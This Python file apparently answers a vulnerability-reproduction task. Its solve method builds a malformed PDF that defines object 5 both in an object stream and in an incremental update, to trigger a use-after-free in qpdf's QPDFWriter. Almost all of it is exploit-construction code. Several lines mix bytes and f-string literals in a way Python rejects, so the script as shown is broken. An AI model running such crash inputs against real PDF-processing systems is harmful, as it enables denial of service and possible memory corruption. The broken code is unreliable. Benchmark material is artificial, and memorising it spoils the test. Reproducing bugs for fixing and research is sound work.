import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability occurs in QPDFWriter when handling a PDF with conflicting
        object definitions, specifically when an object is defined both within an
        object stream and as a standalone object via an incremental update. This
        creates "multiple entries for the same object id," which the function
        QPDF::getCompressibleObjSet mishandles, leading to a premature free.
        Subsequent use of the object results in a use-after-free.

        This PoC constructs such a PDF:
        1. An initial version defines object 5 as being compressed within an
           object stream (object 4). This requires an xref stream to describe
           the compressed object's location.
        2. An incremental update redefines object 5 as a regular, standalone object.
           A second xref stream is added to describe this update.

        When a qpdf process with object stream preservation enabled (like in
        `--object-streams=preserve`) reads this file, the dual definition of object 5
        triggers the bug.
        """
        
        # --- Part 1: Initial PDF with a compressed object ---

        obj1 = b"1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj"
        obj2 = b"2 0 obj\n<</Type/Pages/Count 1/Kids[3 0 R]>>\nendobj"
        obj3 = b"3 0 obj\n<</Type/Page/MediaBox[0 0 100 100]>>\nendobj"
        
        # Object 5 is compressed inside object stream 4.
        obj5_content = b"<</MyData 5>>"
        obj4_stream_data = b"5 0 " + obj5_content
        
        obj4 = (
            b"4 0 obj\n"
            b"<</Type/ObjStm/N 1/First 4"
            f"/Length {len(obj4_stream_data)}>>\n"
            b"stream\n"
            f"{obj4_stream_data.decode()}\n"
            b"endstream\nendobj"
        )
        
        body1_parts = [b"%PDF-1.7", obj1, obj2, obj3, obj4]
        body1 = b"\n".join(body1_parts) + b"\n"
        
        offsets1 = {
            1: body1.find(b"1 0 obj"),
            2: body1.find(b"2 0 obj"),
            3: body1.find(b"3 0 obj"),
            4: body1.find(b"4 0 obj"),
        }
        
        # XRef Stream for Part 1 (as object 6).
        # /W[1 8 2] -> 1-byte type, 8-byte field2, 2-byte field3.
        xref_stream1_entries = b"".join([
            struct.pack(">BQH", 0, 0, 65535),      # obj 0 (type 0 = free)
            struct.pack(">BQH", 1, offsets1[1], 0), # obj 1 (type 1 = uncompressed)
            struct.pack(">BQH", 1, offsets1[2], 0), # obj 2
            struct.pack(">BQH", 1, offsets1[3], 0), # obj 3
            struct.pack(">BQH", 1, offsets1[4], 0), # obj 4
            struct.pack(">BQH", 2, 4, 0),          # obj 5 (type 2 = compressed)
        ])
        
        xref_stream1_obj_num = 6
        xref_stream1_dict = (
            b"<</Type/XRef"
            b"/Size 7" # Total objects in this revision is 0-6
            b"/W[1 8 2]"
            b"/Root 1 0 R"
            b"/Index[0 1 1 5]" # Describes obj 0, then objs 1-5
            f"/Length {len(xref_stream1_entries)}"
            b">>"
        )
        
        obj6_offset = len(body1)
        obj6 = (
            f"{xref_stream1_obj_num} 0 obj\n".encode()
            + xref_stream1_dict + b"\n"
            b"stream\n"
            + xref_stream1_entries + b"\n"
            b"endstream\nendobj"
        )
        
        part1_content = body1 + obj6 + b"\n"
        
        trailer1 = (
            b"startxref\n"
            f"{obj6_offset}\n".encode()
            b"%%EOF"
        )
        
        poc_part1 = part1_content + trailer1
        
        # --- Part 2: Incremental update redefining object 5 ---
        
        obj5_redefined = b"5 0 obj\n<</Redefined true>>\nendobj"
        body2 = b"\n" + obj5_redefined + b"\n"

        # New XRef Stream for Part 2 (as object 7).
        offset_obj5_new = len(poc_part1) + body2.find(b"5 0 obj")

        xref_stream2_entries = struct.pack(">BQH", 1, offset_obj5_new, 0)

        xref_stream2_obj_num = 7
        xref_stream2_dict = (
            b"<</Type/XRef"
            b"/Size 8" # Total objects now 0-7
            b"/W[1 8 2]"
            b"/Root 1 0 R"
            b"/Index[5 1]" # Describes 1 object starting from ID 5
            f"/Prev {obj6_offset}" # Link to previous xref stream
            f"/Length {len(xref_stream2_entries)}"
            b">>"
        )
        
        obj7_offset = len(poc_part1) + len(body2)
        obj7 = (
            f"{xref_stream2_obj_num} 0 obj\n".encode()
            + xref_stream2_dict + b"\n"
            b"stream\n"
            + xref_stream2_entries + b"\n"
            b"endstream\nendobj"
        )
        
        part2_content = body2 + obj7 + b"\n"
        
        trailer2 = (
            b"startxref\n"
            f"{obj7_offset}\n".encode()
            b"%%EOF"
        )
        
        poc_part2 = part2_content + trailer2
        
        return poc_part1 + poc_part2